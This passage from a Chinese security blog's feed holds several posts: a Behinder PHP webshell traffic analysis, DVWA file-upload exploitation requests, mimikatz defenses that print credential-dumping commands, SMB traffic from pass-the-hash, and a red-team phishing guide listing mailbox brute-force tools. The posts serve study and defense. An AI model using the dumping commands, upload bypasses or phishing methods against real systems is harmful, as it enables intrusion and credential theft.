base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&apos;k&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">     $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">return $data;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;$cmd=&quot;whoami&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure><p>可以在最后几行看出执行了系统命令</p><p>同样我们可以通过AES-&gt;base64解密返回包看到返回的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原始返回数据：</span><br><span class="line">WR+Yx9S+tk8IDtZhi4EN45n/tBuHL/twS/lcdbMjmCGgZVd7h6Y8g1a97iLoDycgePW1rFM0ijMlPpi2kBxu6w==</span><br><span class="line">AES解密后数据：</span><br><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;c3dhZzctcGNcc3dhZzcNCg==&quot;&#125;</span><br><span class="line">base64解密后的msg：</span><br><span class="line">swag7-pc\swag7</span><br></pre></td></tr></table></figure><p>同理，我们可以分析出Behinder其他功能实现的相关代码。</p><h1 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h1><p>1.十六位秘钥<br>2.Get请求pass参数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;冰蝎为一款主流Webshell管理工具，本篇分析Benhinder2.0中php shell流量。&lt;/p&gt;
&lt;p&gt;Github:&lt;a href=&quot;https://github.com/rebeyond/Behinder/releases/tag/Behinder_v2.0&quot;
      
    
    </summary>
    
    
    
      <category term="webshell" scheme="http://sherlocz.github.io/tags/webshell/"/>
    
      <category term="流量分析" scheme="http://sherlocz.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>fofa通过证书收集资产</title>
    <link href="http://sherlocz.github.io/2021/06/09/fofa%E9%80%9A%E8%BF%87%E8%AF%81%E4%B9%A6%E6%94%B6%E9%9B%86%E8%B5%84%E4%BA%A7/"/>
    <id>http://sherlocz.github.io/2021/06/09/fofa通过证书收集资产/</id>
    <published>2021-06-09T01:05:28.000Z</published>
    <updated>2021-06-21T02:09:40.106Z</updated>
    
    <content type="html"><![CDATA[<p>感觉自己每次信息收集都很有问题，积累一下看下次是否能够应用到实际当中</p><h1 id="获取网站证书序列号"><a href="#获取网站证书序列号" class="headerlink" title="获取网站证书序列号"></a>获取网站证书序列号</h1><p><img src="/2021/06/09/fofa通过证书收集资产/序列号.png" alt></p><h1 id="将序列号转换成十进制"><a href="#将序列号转换成十进制" class="headerlink" title="将序列号转换成十进制"></a>将序列号转换成十进制</h1><p><img src="/2021/06/09/fofa通过证书收集资产/10.png" alt></p><h1 id="一把梭"><a href="#一把梭" class="headerlink" title="一把梭"></a>一把梭</h1><p>转换成10进制之后放在fofa里面搜索就行了~<br><img src="/2021/06/09/fofa通过证书收集资产/fofa.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;感觉自己每次信息收集都很有问题，积累一下看下次是否能够应用到实际当中&lt;/p&gt;
&lt;h1 id=&quot;获取网站证书序列号&quot;&gt;&lt;a href=&quot;#获取网站证书序列号&quot; class=&quot;headerlink&quot; title=&quot;获取网站证书序列号&quot;&gt;&lt;/a&gt;获取网站证书序列号&lt;/h1&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
      <category term="信息收集" scheme="http://sherlocz.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>dvwa文件上传审计</title>
    <link href="http://sherlocz.github.io/2021/02/10/dvwa-file-upload/"/>
    <id>http://sherlocz.github.io/2021/02/10/dvwa-file-upload/</id>
    <published>2021-02-10T08:23:04.000Z</published>
    <updated>2021-02-19T06:59:27.906Z</updated>
    
    <content type="html"><![CDATA[<p>dvwa下载地址：<a href="https://dvwa.co.uk/" title="https://dvwa.co.uk/" target="_blank" rel="noopener">click</a></p><h1 id="Low-Level"><a href="#Low-Level" class="headerlink" title="Low Level"></a>Low Level</h1><p>源代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>我们需要一个Upload参数(任意值)和一个文件上传的格式，数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /DVWA/vulnerabilities/upload/ HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://test.com/DVWA/security.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8</span><br><span class="line">Cookie: security=low; PHPSESSID=7di0vblgbbtq8ghh5gchrqltj4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------1874220292</span><br><span class="line">Content-Length: 191</span><br><span class="line"></span><br><span class="line">----------1874220292</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">----------1874220292</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;;filename=&quot;1.jsp&quot;</span><br><span class="line"></span><br><span class="line">q</span><br><span class="line">----------1874220292--</span><br></pre></td></tr></table></figure></p><p>这样就行<br><img src="/2021/02/10/dvwa-file-upload/low.jpg" alt></p><h1 id="Medium-Level"><a href="#Medium-Level" class="headerlink" title="Medium Level"></a>Medium Level</h1><p>源代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这里可以一眼看出，我们在 low 的条件下，加上content-type为image/jpeg就行了，构造数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /DVWA/vulnerabilities/upload/ HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://test.com/DVWA/security.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8</span><br><span class="line">Cookie: security=medium; PHPSESSID=7di0vblgbbtq8ghh5gchrqltj4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------1258090497</span><br><span class="line">Content-Length: 222</span><br><span class="line"></span><br><span class="line">----------1258090497</span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">----------1258090497</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;;filename=&quot;123123.jsp&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">q</span><br><span class="line">----------1258090497--</span><br></pre></td></tr></table></figure></p><p><img src="/2021/02/10/dvwa-file-upload/medium.jpg" alt></p><h1 id="High-Level"><a href="#High-Level" class="headerlink" title="High Level"></a>High Level</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123;</span><br><span class="line">// Where are we going to be writing to?</span><br><span class="line">$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">$target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// File information</span><br><span class="line">$uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</span><br><span class="line">$uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line">$uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Is it an image?</span><br><span class="line">if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;</span><br><span class="line">( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">// Can we move the file to the upload folder?</span><br><span class="line">if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">// No</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Yes!</span><br><span class="line">$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Invalid file</span><br><span class="line">$html .= &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里直接限定了后缀名，使用00截断进行绕过</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;dvwa下载地址：&lt;a href=&quot;https://dvwa.co.uk/&quot; title=&quot;https://dvwa.co.uk/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;click&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Low-Level&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://sherlocz.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>mimikatz防御方式</title>
    <link href="http://sherlocz.github.io/2021/01/06/how-to-prevent-mimikatz-attack/"/>
    <id>http://sherlocz.github.io/2021/01/06/how-to-prevent-mimikatz-attack/</id>
    <published>2021-01-06T08:02:31.000Z</published>
    <updated>2021-01-07T06:53:26.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="限制使用Debug权限"><a href="#限制使用Debug权限" class="headerlink" title="限制使用Debug权限"></a>限制使用Debug权限</h1><p>当我们限制了Debug之后，就没有权限与lsass.exe进程进行交互读取其中存储的明文密码和hash。</p><p>正常情况下，使用mimikatz进行提权：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MIMIKATZ # privilege::debug</span><br><span class="line">Privilege &apos;20&apos; OK</span><br></pre></td></tr></table></figure></p><p>配置如下：<br>本地安全策略–&gt;本地策略–&gt;用户权限分配–&gt;调试程序<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/debug_setting.png" alt></p><p>域内可以将不需要执行debug的权限删除掉，这里我将本地administrator用户权限删除，并重新启动计算机。</p><p>利用mimikatz执行提权，权限提升失败<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/mimikatz.png" alt></p><p>使用procdump离线读取，失败<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/procdump.png" alt></p><p>lsass进程转储文件，提示无权限<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/lsass.png" alt></p><h1 id="限制使用WDigest协议"><a href="#限制使用WDigest协议" class="headerlink" title="限制使用WDigest协议"></a>限制使用WDigest协议</h1><p>mimikatz可以通过wdigest协议读取存储在lsass进程中的明文密码：<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/wdigest.png" alt></p><p>Windows 8.1/Windows 10/Windows Server 2012 R2和Windows Server 2016已经默认禁用此协议，但是早期的操作系统如Windows 7和Windows Server 2008等需要安装补丁 <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" title="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" target="_blank" rel="noopener">KB2871997</a>，安装完补丁后需确认 WDigest已经在注册表中被禁用，注册表项的位置为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest</span><br></pre></td></tr></table></figure></p><p>将Negotiate和UseLogonCredential的值都设置成0，若没有需要创建，重启计算机之后再次尝试读取密码，发现无法抓取到hash。</p><p>批处理命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/wdigest-null.png" alt></p><h1 id="LSASS进程保护"><a href="#LSASS进程保护" class="headerlink" title="LSASS进程保护"></a>LSASS进程保护</h1><p>windows server 2012 / Windows 8.1及以后的版本操作系统已经升级了额外的LSA防护措施，来阻止不信任的进程读取LSASS进程内存或注入代码。</p><p>首先，攻击者可通过一下mimikatz命令抓取主机密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/logonpasswords.png" alt></p><p>为了避免密码被抓取，我们可以启用LSA进程守护，具体操作如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA</span><br></pre></td></tr></table></figure></p><p>将runasppl值设置为1，重启计算机</p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/runasppl.png" alt></p><h1 id="清除凭据缓存"><a href="#清除凭据缓存" class="headerlink" title="清除凭据缓存"></a>清除凭据缓存</h1><p>默认情况下，用户登录系统需要使用最近几次的凭证缓存进行身份验证，存放路径如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SECURITY\Cache</span><br></pre></td></tr></table></figure></p><p>我们可以使用mimikatz抓取缓存凭证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::cache</span><br></pre></td></tr></table></figure></p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/cache.png" alt></p><p>会列出最近几次缓存用户的mscache hash，这样我们可以使用mimikatz更改该hash或者爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#更改密码为123456</span><br><span class="line">lsadump::cache /user:jack ntlm:32ed87bdb5fdc5e9cba88547376818d4</span><br></pre></td></tr></table></figure><p>修改他后，在域控制器不可用时，我们可以哟弄jack/123456进行登陆，估计实战意义不大。</p><p>默认情况下，windows会保存进10次认证的密码，配置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地安全策略--&gt;本地策略--&gt;安全选项--&gt;交互式登陆:之前登陆到缓存的次数(域控制器不可用时)</span><br></pre></td></tr></table></figure></p><p>我们将缓存此时修改成0，可以避免缓存被抓取<br><img src="/2021/01/06/how-to-prevent-mimikatz-attack/cache0.png" alt></p><h1 id="Protected-Users-安全组"><a href="#Protected-Users-安全组" class="headerlink" title="Protected Users 安全组"></a>Protected Users 安全组</h1><p>限制该组用户只能使用kerberos进行认证，可防止hash和明文被抓取。</p><p><img src="/2021/01/06/how-to-prevent-mimikatz-attack/protect.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;限制使用Debug权限&quot;&gt;&lt;a href=&quot;#限制使用Debug权限&quot; class=&quot;headerlink&quot; title=&quot;限制使用Debug权限&quot;&gt;&lt;/a&gt;限制使用Debug权限&lt;/h1&gt;&lt;p&gt;当我们限制了Debug之后，就没有权限与lsass.exe进程进行交
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Mimikatz" scheme="http://sherlocz.github.io/tags/Mimikatz/"/>
    
  </entry>
  
  <entry>
    <title>Smb协议基础</title>
    <link href="http://sherlocz.github.io/2021/01/05/Smb-Intro/"/>
    <id>http://sherlocz.github.io/2021/01/05/Smb-Intro/</id>
    <published>2021-01-05T07:24:53.000Z</published>
    <updated>2021-01-06T03:22:10.246Z</updated>
    
    <content type="html"><![CDATA[<p>dir \192.168.75.131\c$<br>pth过去后dir的流量pcap包如下：<br><img src="/2021/01/05/Smb-Intro/pthpacp.png" alt></p><p>复制mimikatz流量包如下：<br>xcopy mimikatz.exe \192.168.75.131\c$\temp\mimikatz.exe<br><img src="/2021/01/05/Smb-Intro/copy.png" alt><br>1、128告诉131要创建temp\mimikatz.exe文件<br>2、使用Getinfo检索正在写入的文件系统的一些信息<br>3、Setinfo发送一些长度信息<br>4、通过write标记写入文件<br>5、关闭，传输完成</p><p>下载mimikatz<br>copy \192.168.\c$\temp\mimikatz.exe c:\temp\mimikatz.exe<br><img src="/2021/01/05/Smb-Intro/download.png" alt><br>1、请求开始<br>2、Getinfo从文件中获取数据<br>3、读取请求</p><p>远程调用<br>net user /domain<br><img src="/2021/01/05/Smb-Intro/netuser.png" alt><br>1、协商<br>2、连接到dc的ipc共享<br>3、创建请求文件<br>4、调用RPC绑定<br>5、枚举用户</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bbs.pediy.com/thread-223721.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223721.htm</a><br><a href="https://github.com/401trg/detections/tree/master/pdfs" target="_blank" rel="noopener">https://github.com/401trg/detections/tree/master/pdfs</a><br><a href="https://gallery.technet.microsoft.com/ATA-Playbook-ef0a8e38" target="_blank" rel="noopener">https://gallery.technet.microsoft.com/ATA-Playbook-ef0a8e38</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;dir \192.168.75.131\c$&lt;br&gt;pth过去后dir的流量pcap包如下：&lt;br&gt;&lt;img src=&quot;/2021/01/05/Smb-Intro/pthpacp.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;复制mimikatz流量包如下：&lt;br&gt;xcopy mimi
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="协议" scheme="http://sherlocz.github.io/tags/%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>攻防演练中的钓鱼攻击</title>
    <link href="http://sherlocz.github.io/2021/01/05/A-D-Phishing/"/>
    <id>http://sherlocz.github.io/2021/01/05/A-D-Phishing/</id>
    <published>2021-01-05T02:15:17.000Z</published>
    <updated>2021-01-05T06:17:34.041Z</updated>
    
    <content type="html"><![CDATA[<p>随着攻防演练的进行，外网能够直接进入内网必定会越来越困难，而且常规Web渗透耗时长，这个时候利用钓鱼攻击不仅效率高，并且能够为我们节省大量的时间和人力，说不定未来钓鱼攻击会成为每个一线渗透人员必须掌握的技能。</p><p>钓鱼的手法有很多种，其中我们会遇到各种各样的问题，要去不断的进行尝试，反思。</p><h1 id="红队钓鱼攻击流程"><a href="#红队钓鱼攻击流程" class="headerlink" title="红队钓鱼攻击流程"></a>红队钓鱼攻击流程</h1><p><img src="/2021/01/05/A-D-Phishing/钓鱼.png" alt></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>前期的准备是为了让我们有充足的时间去思考会发生的各种问题，而在我们没有收集到足够信息之前，建议不要盲目进行钓鱼。</p><h3 id="突破口选择"><a href="#突破口选择" class="headerlink" title="突破口选择"></a>突破口选择</h3><p>钓鱼需要一个下手的地方，对于我们的目标，通常会有多个钓鱼的口子供我们选择，如：</p><ul><li>QQ/微信(群)钓鱼</li><li>客服钓鱼</li><li>邮件钓鱼</li><li>电话钓鱼</li><li>……</li></ul><p>想到了可以突破的点，我们就需要去搜寻相关信息。</p><h4 id="QQ-微信群收集"><a href="#QQ-微信群收集" class="headerlink" title="QQ/微信群收集"></a>QQ/微信群收集</h4><p>很多公司都会开放对外的客服群、售后群、活动群甚至内部员工群、公司群，通过QQ或者其他的搜索方式多多少少都能搜索到群聊，伪装成员工或者客服进群聊。<br><img src="/2021/01/05/A-D-Phishing/QQ群.png" alt></p><p>如何伪装进入群聊：<br>1、修改个人信息为员工/客户信息(包括姓名、签名、头像等等)<br>2、提前半个月或者一个月进入群聊(攻防演练阶段进去的可能性不大)</p><h4 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h4><p>邮箱的收集会很重要，所以尽量收集全面一点，最好能够弄到邮箱的账号密码，对后期钓鱼很有用，整体思路如下：<br><img src="/2021/01/05/A-D-Phishing/邮箱收集.png" alt></p><p>邮箱收集网址和工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bit4woo/teemo</span><br><span class="line">https://github.com/laramies/theHarvester</span><br><span class="line">https://www.email-format.com/i/search/</span><br></pre></td></tr></table></figure></p><p>邮箱验证网址和工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mailtester.com/testmail.php</span><br><span class="line">https://github.com/Tzeross/verifyemail</span><br></pre></td></tr></table></figure></p><p>邮箱爆破工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shack2/SNETCracker</span><br><span class="line">https://github.com/sensepost/ruler</span><br><span class="line">brupsuite</span><br></pre></td></tr></table></figure></p><p>推荐使用pop/smtp协议爆破，web端爆破可能会产生告警</p><h3 id="其他信息调研"><a 